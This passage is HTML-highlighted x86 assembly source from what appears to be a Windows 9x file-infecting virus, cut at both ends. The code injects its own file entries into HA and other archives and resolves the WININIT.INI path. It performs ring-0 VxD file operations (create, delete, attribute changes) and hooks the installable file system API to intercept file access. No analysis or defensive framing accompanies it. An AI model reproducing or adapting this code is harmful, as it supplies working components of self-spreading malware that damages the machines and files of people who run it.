        </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc10">LARGE</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc5">HA_PATH</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">EXIT_ARJ</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">REPNE</span><span class="sc0">   </span><span class="sc6">SCASB</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">EXIT_ARJ</span><span class="sc0">
        </span><span class="sc6">REPNE</span><span class="sc0">   </span><span class="sc6">SCASB</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">EXIT_ARJ</span><span class="sc0">
        </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc4">,[</span><span class="sc8">EDI</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,[</span><span class="sc8">EDI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc8">ESI</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EDI</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ESI.HA_VER_METHOD</span><span class="sc4">],</span><span class="sc2">0EH</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">SKIP_EXE_HA</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc5">ZIP_FILE_COUNTER</span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,[</span><span class="sc8">ECX</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ESI</span><span class="sc0">
        </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,[</span><span class="sc5">ESI.HA_PATH</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc8">ESI</span><span class="sc0">
        </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc5">OUR_HA_FHEADER.HA_PATH</span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0"> </span><span class="sc10">LARGE</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">TEST_EXEC_SPEC</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc4">,[</span><span class="sc8">ESI</span><span class="sc4">+</span><span class="sc8">ECX</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">SKIP_EXE_HA</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">
        </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc5">OUR_HA_FHEADER</span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc9">SIZE</span><span class="sc0"> </span><span class="sc5">HA_FILE_HEADER</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">OUR_HA_FH_LEN</span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">],</span><span class="sc8">ECX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc5">HA_STORED</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ESI.HA_FILE_TIME</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EDI.HA_FILE_TIME</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">EAX</span><span class="sc0">
</span><span class="sc5">SKIP_EXE_HA</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,[</span><span class="sc5">ESI.HA_COMPRESS_SIZE</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">READ_HA_FH</span><span class="sc0">
</span><span class="sc5">HA_DONE</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">CHECK_ARCOUNT</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">EXIT_HA</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ESI</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc0">
        </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc5">OUR_HA_FHEADER</span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ESI.HA_COMPRESS_SIZE</span><span class="sc4">],</span><span class="sc8">ECX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ESI.HA_ORIGINAL_SIZE</span><span class="sc4">],</span><span class="sc8">ECX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ESI.HA_CRC32</span><span class="sc4">],</span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc2">12345678H</span><span class="sc0">
        </span><span class="sc5">GOFF</span><span class="sc0">    </span><span class="sc5">OUR_HA_FH_LEN</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">ZIP1_INSERT_FILE</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc0">
        </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">EXIT_HA</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">ZIP1_INSERT_FILE</span><span class="sc0">
        </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc5">HEADER</span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc0">
        </span><span class="sc6">JNB</span><span class="sc0"> </span><span class="sc5">SET_WRITE_FILE</span><span class="sc0">
</span><span class="sc5">EXIT_HA</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">RETN</span><span class="sc0">

</span><span class="sc1">;------------------------------------------------</span><span class="sc0">
</span><span class="sc5">GET_WININIT</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc5">WININIT_INI</span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc5">LEN_WININIT_INI</span><span class="sc0">
</span><span class="sc1">;ENTRY: ESI=&amp;FILENAME,CL=STRLEN(ESI)+1</span><span class="sc0">
</span><span class="sc1">;EXIT: ESI=&amp;FULLNAME</span><span class="sc0">
</span><span class="sc5">CONCAT_WINDIR</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">MOVZX</span><span class="sc0">   </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc8">CL</span><span class="sc0">
        </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc5">TMP_PATH</span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EDI</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,[</span><span class="sc8">EDI</span><span class="sc4">-</span><span class="sc5">SYS_PATH_DELTA</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">COPY_SYS_PATH</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">MOVSB</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc4">,[</span><span class="sc8">ESI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">COPY_SYS_PATH</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc0">
        </span><span class="sc6">REP</span><span class="sc0"> </span><span class="sc6">MOVSB</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">],</span><span class="sc8">CL</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc0">
        </span><span class="sc6">RETN</span><span class="sc0">

</span><span class="sc1">;------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;ENTRY: ON STACK - DWORD OF VXD</span><span class="sc0">
        </span><span class="sc5">GOFF</span><span class="sc0">    </span><span class="sc5">CLI_VXD_CALL</span><span class="sc0">
        </span><span class="sc6">CLI</span><span class="sc0">
        </span><span class="sc5">GOFF</span><span class="sc0">    </span><span class="sc5">OFF_VXD_CALL</span><span class="sc0">
</span><span class="sc5">VXD_CALL</span><span class="sc0">    </span><span class="sc9">PROC</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,[</span><span class="sc8">EBP</span><span class="sc4">-</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EAX</span><span class="sc4">],</span><span class="sc2">1234H</span><span class="sc0">
        </span><span class="sc9">ORG</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">20H</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc4">,[</span><span class="sc8">ESP</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc4">,[</span><span class="sc8">ESP</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">
        </span><span class="sc9">ENDP</span><span class="sc0">

</span><span class="sc1">;------------------------------------------------</span><span class="sc0">
</span><span class="sc5">OPEN_CREATE</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc8">ECX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc5">ACTION_CREATEALWAYS</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc5">OPEN_FLAGS_COMMIT</span><span class="sc0"> </span><span class="sc6">OR</span><span class="sc0"> </span><span class="sc5">OPEN_FLAGS_NOCRITERR</span><span class="sc0"> </span><span class="sc6">OR</span><span class="sc0"> \
            </span><span class="sc5">ACCESS_WRITEONLY</span><span class="sc0"> </span><span class="sc6">OR</span><span class="sc0"> </span><span class="sc5">OPEN_SHARE_DENYREADWRITE</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">GO_OPEN_CREATE</span><span class="sc0">
</span><span class="sc5">OPEN_FILE_RO</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BL</span><span class="sc4">,</span><span class="sc5">OPEN_ACCESS_RO_NOMODLASTACCESS</span><span class="sc0"> </span><span class="sc6">OR</span><span class="sc0"> </span><span class="sc5">OPEN_SHARE_DENYWRITE</span><span class="sc0">
</span><span class="sc1">;BL=METHOD</span><span class="sc0">
</span><span class="sc5">OPEN_FILE</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc4">,</span><span class="sc8">EDX</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc0">         </span><span class="sc1">;FILE_OPEN</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BH</span><span class="sc4">,</span><span class="sc5">OPEN_FLAGS_NOCRITERR</span><span class="sc0"> </span><span class="sc6">SHR</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
</span><span class="sc5">GO_OPEN_CREATE</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc5">R0_OPENCREATFILE</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">FILE_IO</span><span class="sc0">

</span><span class="sc1">;------------------------------------------------</span><span class="sc0">
</span><span class="sc5">GET_ATTRIBUTES</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc5">FGET_ATTRIBUTES</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc2">12345678H</span><span class="sc0">
        </span><span class="sc9">ORG</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">

</span><span class="sc1">;------------------------------------------------</span><span class="sc0">
</span><span class="sc5">CLR_ATTRIBUTES</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc4">,</span><span class="sc8">ECX</span><span class="sc0">
</span><span class="sc5">SET_ATTRIBUTES</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc5">FSET_ATTRIBUTES</span><span class="sc0">

</span><span class="sc1">;------------------------------------------------</span><span class="sc0">
</span><span class="sc5">MAN_ATTRIBUTES</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc5">R0_FILEATTRIBUTES</span><span class="sc0"> </span><span class="sc6">SHR</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc2">12345678H</span><span class="sc0">
        </span><span class="sc9">ORG</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">

</span><span class="sc1">;------------------------------------------------</span><span class="sc0">
</span><span class="sc5">CLOSE_FILE</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc5">R0_CLOSEFILE</span><span class="sc0">

</span><span class="sc1">;------------------------------------------------</span><span class="sc0">
</span><span class="sc5">FILE_IO</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">MOVZX</span><span class="sc0">   </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc5">RING0_FILEIO</span><span class="sc0">
</span><span class="sc5">GO_VXD_CALL</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">VXD_CALL</span><span class="sc0">
        </span><span class="sc6">RETN</span><span class="sc0">

</span><span class="sc1">;------------------------------------------------</span><span class="sc0">
</span><span class="sc5">DELETE_FILE</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc2">27H</span><span class="sc0">          </span><span class="sc1">;ALL ATTRIBUTES</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc5">R0_DELETEFILE</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">FILE_IO</span><span class="sc0">

</span><span class="sc1">;------------------------------------------------</span><span class="sc0">
</span><span class="sc5">GET_SYS_TIME</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc5">GET_SYSTEM_TIME</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">GO_VXD_CALL</span><span class="sc0">

</span><span class="sc1">;------------------------------------------------</span><span class="sc0">
</span><span class="sc5">GETSIZE_FILE</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc5">R0_GETFILESIZE</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">FILE_IO</span><span class="sc0">

</span><span class="sc1">;------------------------------------------------</span><span class="sc0">
</span><span class="sc5">IAPI_HOOKER</span><span class="sc0"> </span><span class="sc9">PROC</span><span class="sc0">
        </span><span class="sc5">GOFF</span><span class="sc0">    </span><span class="sc5">OFF_IAPI_HOOKER</span><span class="sc0">
        </span><span class="sc5">BREAK</span><span class="sc0">
        </span><span class="sc6">PUSHAD</span><span class="sc0">
        </span><span class="sc5">ENTERD</span><span class="sc0">  </span><span class="sc5">STACK_FRAME</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">;FOR VXD_CALL</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">CALC_DELTA</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc5">OLD_IFS_HOOKER</span><span class="sc4">[</span><span class="sc8">EDX</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;EAX</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">TEST_VXD</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">IAPI_EXIT</span><span class="sc0">
        </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc5">OFF_IFS_HOOKER</span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc5">OLD_RAPI_HOOKER</span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;REMOVE OUR API HOOKER</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;1ST PARAMETER</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc2">12345678H</span><span class="sc0">
        </span><span class="sc5">GOFF</span><span class="sc0">    </span><span class="sc5">OLD_IAPI_HOOKER</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc8">ESI</span><span class="sc0">         </span><span class="sc1">;INSTALL NEW API HOOKER</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">EAX</span><span class="sc0">     </span><span class="sc1">;EAX</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc8">ESI</span><span class="sc0">         </span><span class="sc1">;REINSTALL OUR API HOOKER</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">OLD_IFS_HOOKER</span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">],</span><span class="sc8">EAX</span><span class="sc0">
</span><span class="sc5">IAPI_EXIT</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc5">LEAVED</span><span class="sc0">
        </span><span class="sc6">POPAD</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">
        </span><span class="sc9">ENDP</span><span class="sc0">

</span><span class="sc1">;------------------------------------------------</span><span class="sc0">
</span><span class="sc5">RAPI_HOOKER</span><span class="sc0"> </span><span class="sc9">PROC</span><span class="sc0">
        </span><span class="sc5">GOFF</span><span class="sc0">    </span><span class="sc5">OFF_RAPI_HOOKER</span><span class="sc0">
        </span><span class="sc5">BREAK</span><span class="sc0">
        </span><span class="sc6">PUSHAD</span><span class="sc0">
        </span><span class="sc5">ENTERD</span><span class="sc0">  </span><span class="sc5">STACK_FRAME</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">;FOR VXD_CALL</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">CALC_DELTA</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">TEST_VXD</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">RAPI_EXIT</span><span class="sc0">
        </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc5">RAPI_RET_ADDRESS</span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EAX</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">EDX</span><span class="sc0">     </span><span class="sc1">;STORE ORIGINAL RETURN ADDRESS</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">EAX</span><span class="sc0">     </span><span class="sc1">;RETURN ADDRESS</span><span class="sc0">
</span><span class="sc5">RAPI_EXIT</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc5">LEAVED</span><span class="sc0">
        </span><span class="sc6">POPAD</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc2">12345678H</span><span class="sc0">
        </span><span class="sc5">GOFF</span><span class="sc0">    </span><span class="sc5">OLD_RAPI_HOOKER</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">
        </span><span class="sc5">GOFF</span><span class="sc0">    </span><span class="sc5">RAPI_RET_ADDRESS</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc2">12345678H</span><span class="sc0">       </span><span class="sc1">;+1 ORIGINAL RETURN ADDRESS</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">RET</span><span class="sc0">
        </span><span class="sc9">ENDP</span><span class="sc0">

</span><span class="sc1">;------------------------------------------------</span><span class="sc0">
</span><span class="sc5">TEST_VXD</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc4">,[</span><span class="sc8">EBP</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;RETURN ADDRESS</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc8">EDX</span><span class="sc0">
        
</span><span class="sc5">TEST_VXD_HOOK</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">LEA</span><span class="sc0"> </span><span class="sc8">ESI</span><span class="sc4">,</span><span class="sc5">VXD_NAME</span><span class="sc4">[</span><span class="sc8">EDI</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;EAX = CHECKING ADDRESS</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ESI</span><span class="sc0"> </span><span class="sc8">EAX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc5">_GETVXDNAME</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">VXD_CALL</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">EDX</span><span class="sc0"> </span><span class="sc8">ECX</span><span class="sc0">
</span><span class="sc5">VXDCMP_ONLY</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ESI</span><span class="sc4">],</span><span class="sc12">'59KG'</span><span class="sc0">  </span><span class="sc1">;GK95?</span><span class="sc0">
